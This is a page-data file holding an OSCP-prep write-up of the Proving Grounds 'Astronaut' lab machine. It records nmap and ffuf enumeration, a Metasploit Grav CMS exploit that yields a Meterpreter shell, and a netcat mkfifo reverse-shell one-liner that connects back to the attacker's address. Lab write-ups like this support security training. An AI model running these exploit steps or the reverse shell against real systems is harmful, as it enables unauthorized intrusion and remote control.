{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240928/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>1. Recon</h2>\n<ul>\n<li>nmap scan</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n┌──(hosan㉿kali)-[~]\r\n└─$ sudo nmap 192.168.216.12 -p- -T4\r\n[sudo] password for hosan:\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-14 13:00 EDT\r\nNmap scan report for 192.168.216.12\r\nHost is up (0.031s latency).\r\nNot shown: 65533 closed tcp ports (reset)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 16.78 seconds\r\n</code></pre></div>\n<p>Nothing speical, only http service</p>\n<ul>\n<li>port 80 (http)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n┌──(hosan㉿kali)-[~]\r\n└─$ sudo nmap 192.168.216.12 -p80 -sC -sV -A\r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-14 13:01 EDT\r\nStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\r\nService scan Timing: About 0.00% done\r\nNmap scan report for 192.168.216.12\r\nHost is up (0.027s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n80/tcp open  http    Apache httpd 2.4.41\r\n|_http-server-header: Apache/2.4.41 (Ubuntu)\r\n| http-ls: Volume /\r\n| SIZE  TIME              FILENAME\r\n| -     2021-03-17 17:46  grav-admin/\r\n|_\r\n|_http-title: Index of /\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.7 (87%), Linux 4.4 (87%), Synology DiskStation Manager 5.1 (87%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 4 hops\r\nService Info: Host: 127.0.0.1\r\n\r\nTRACEROUTE (using port 80/tcp)\r\nHOP RTT      ADDRESS\r\n1   26.28 ms 192.168.45.1\r\n2   26.00 ms 192.168.45.254\r\n3   26.39 ms 192.168.251.1\r\n4   26.54 ms 192.168.216.12\r\n</code></pre></div>\n<p>Okay. Nothing special either.</p>\n<h2>2. Enumeration / Initial Foothold.</h2>\n<p>Visited <a href=\"http://192.168.216.12/grav-admin\" target=\"_blank\" rel=\"nofollow\">http://192.168.216.12/grav-admin</a>:\r\n![[../contentImages/astronaut/1.png]]</p>\n<p>Hmm Grav. I’ve never heard of it.</p>\n<ul>\n<li>robots.txt</li>\n</ul>\n<p>![[../contentImages/astronaut/4.png]]</p>\n<p>Since no DNS services or hostname provided, subdomain/vhost enumeration is not possible.\r\nWhile enumerating the subdirectories, quick search for CVE:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n┌──(hosan㉿kali)-[~]\r\n└─$ searchsploit grav\r\nBitDefender GravityZone 5.1.5.386 - Multiple Vulnerabilities                                                                                                                                              | linux/webapps/34086.txt\r\nCobian Backup 11 Gravity 11.2.0.582 - 'Password' Denial of Service (PoC)                                                                                                                                  | windows/local/50790.py\r\nCobian Backup Gravity 11.2.0.582 - 'CobianBackup11' Unquoted Service Path                                                                                                                                 | windows/local/50791.txt\r\nGrav CMS 1.4.2 Admin Plugin - Cross-Site Scripting                                                                                                                                                        | php/webapps/42131.txt\r\nGrav CMS 1.6.30 Admin Plugin 1.9.18 - 'Page Title' Persistent Cross-Site Scripting                                                                                                                        | php/webapps/49264.txt\r\nGrav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authenticated)                                                                                                                                   | php/webapps/49961.py\r\nGravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)                                                                                                                                        | php/webapps/49973.py\r\nGravCMS 1.10.7 - Unauthenticated Arbitrary File Write (Metasploit)                                                                                                                                        | php/webapps/49788.rb</code></pre></div>\n<p>So there is a metasploit module, always worth trying it.</p>\n<p>I basically tuned some options for exploit to fit our target, but it dropped a shell.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\nmsf6 exploit(linux/http/gravcms_exec) > set RHOSTS 192.168.216.12\r\nRHOSTS => 192.168.216.12\r\nmsf6 exploit(linux/http/gravcms_exec) > set LHOST 192.168.45.154\r\nLHOST => 192.168.45.154\r\nmsf6 exploit(linux/http/gravcms_exec) > set LPORT 80\r\nLPORT => 80\r\nmsf6 exploit(linux/http/gravcms_exec) > set TARGETURI /grav-admin\r\nTARGETURI => /grav-admin\r\nmsf6 exploit(linux/http/gravcms_exec) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.45.154:80\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target appears to be vulnerable.\r\n[*] Sending request to the admin path to generate cookie and token\r\n[+] Cookie and CSRF token successfully extracted !\r\n[*] Implanting payload via scheduler feature\r\n[+] Scheduler successfully created ! Wait up to 93 seconds\r\n[*] Sending stage (39927 bytes) to 192.168.216.12\r\n[*] Cleaning up the scheduler...\r\n[+] The scheduler config successfully cleaned up!\r\n[*] Meterpreter session 1 opened (192.168.45.154:80 -> 192.168.216.12:51198) at 2024-09-14 13:14:03 -0400\r\n\r\nmeterpreter > shell\r\nProcess 55058 created.\r\nChannel 0 created.\r\nwhoami\r\nwww-data</code></pre></div>\n<p>And the subdirectory enumeration didn’t give me anything meaningful:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\n┌──(hosan㉿kali)-[~]\r\n└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://192.168.216.12/grav-admin/FUZZ -e .txt\r\n________________________________________________\r\n\r\nimages                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 103ms]\r\ncache                   [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 106ms]\r\ntmp                     [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 31ms]\r\nlogin.txt               [Status: 200, Size: 13967, Words: 3067, Lines: 190, Duration: 497ms]\r\nlogin                   [Status: 200, Size: 13967, Words: 3067, Lines: 190, Duration: 495ms]\r\nadmin.txt               [Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 554ms]\r\nbin                     [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 68ms]\r\nuser                    [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 77ms]\r\nadmin                   [Status: 200, Size: 15508, Words: 4330, Lines: 139, Duration: 852ms]\r\nlogs                    [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 92ms]\r\nbackup                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 76ms]\r\nhome.txt                [Status: 200, Size: 14014, Words: 2089, Lines: 160, Duration: 288ms]\r\nhome                    [Status: 200, Size: 14014, Words: 2089, Lines: 160, Duration: 313ms]\r\nassets                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 77ms]\r\n.xml                    [Status: 200, Size: 14014, Words: 2089, Lines: 160, Duration: 258ms]\r\nsystem                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 58ms]\r\nforgot_password         [Status: 200, Size: 12383, Words: 2246, Lines: 155, Duration: 341ms]\r\nforgot_password.txt     [Status: 200, Size: 12383, Words: 2246, Lines: 155, Duration: 344ms]\r\n.rss                    [Status: 200, Size: 14014, Words: 2089, Lines: 160, Duration: 311ms]\r\nvendor                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 66ms]\r\nuser_profile            [Status: 200, Size: 13974, Words: 3067, Lines: 190, Duration: 387ms]\r\nactivate_user           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 308ms]\r\nactivate_user.txt       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 312ms]\r\n</code></pre></div>\n<p>Since this shell is instable as hell, I quickly created a revshell with:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&amp;1|nc 192.168.45.241 443 >/tmp/f</code></pre></div>\n<h2>3. PrivEsc</h2>\n<p>Tomorrow. No time for this.</p>\n<p>I found that sudo version is 1.8.31.\r\nThe first things I do during privesc is: sudo -l, kernel exploit, sudo exploit and suid, sgid binaries.</p>\n<p>Next thing:</p>\n<p>![[../contentImages/astronaut/5.png]]</p>\n<p>And we got:</p>\n<p>![[../contentImages/astronaut/6.png]]</p>\n<p>So maybe:</p>\n<p>![[../contentImages/astronaut/7.png]]</p>\n<p>Done!</p>\n<p>New things learned: look into suid binaries and gtfobins more carefully, what does “it doesn’t drop the privielged shell” means? Does it mean that the binary is completely useless?</p>\n<ul>\n<li>hint : think about SUID context.</li>\n</ul>","frontmatter":{"title":"OSCP Prep: Proving Grounds : Astronaut","summary":"Solving Astronaut machine from Proving Grounds","date":"2024.09.28.","before":"2024.09.23.","after":"2024.10.04.","categories":["C-SEC","proving_grounds","full-machine","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABQElEQVR42p2Q207CQBCG+zDiCZSgxBi9kQv1zrfFd1BspVA08QVUJMJuu+se+zstkHBovHCSL7OZ2fn3nw2uOje4vr3D+UUH9UYb9aM2Dhun2N1vltSInb3jNWoFK/WDxgmarTO02pcIBsMRBoOCBC+vb3jqheh27xGGEYbJCDH1oucYUbSAzr2wj4fHcF4n+v0h4jihuwkCbESe5/De478RFAKbLENrjfePT2KM8dekxFqLqpkl2w7JnTGGBh0JGvA0gxASGVFkQ7V531Y7XNm1TC7LYBiD4RyWzl5KOCnKupYKUmo4peHJPVa22RZchHcOnHHMplOINIU1lhy50rmnee/zv/9wS5BeZZnAhAl8pwqzVGLKBbhQSH8stPVwPq8yty647Asa4Noi1Q5MFZlQBkzaUjBTjrBQ9Md5xcq/kDiLd16fWocAAAAASUVORK5CYII="},"images":{"fallback":{"src":"/static/2403c6454c4ed7da42dd2cb7c8ac1f21/11129/1.png","srcSet":"/static/2403c6454c4ed7da42dd2cb7c8ac1f21/15f3c/1.png 476w,\n/static/2403c6454c4ed7da42dd2cb7c8ac1f21/d6c61/1.png 951w,\n/static/2403c6454c4ed7da42dd2cb7c8ac1f21/11129/1.png 1902w","sizes":"(min-width: 1902px) 1902px, 100vw"},"sources":[{"srcSet":"/static/2403c6454c4ed7da42dd2cb7c8ac1f21/b75bb/1.webp 476w,\n/static/2403c6454c4ed7da42dd2cb7c8ac1f21/283f0/1.webp 951w,\n/static/2403c6454c4ed7da42dd2cb7c8ac1f21/0a012/1.webp 1902w","type":"image/webp","sizes":"(min-width: 1902px) 1902px, 100vw"}]},"width":1902,"height":850}},"publicURL":"/static/2403c6454c4ed7da42dd2cb7c8ac1f21/1.png"}}}}]}},"pageContext":{"slug":"/240928/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}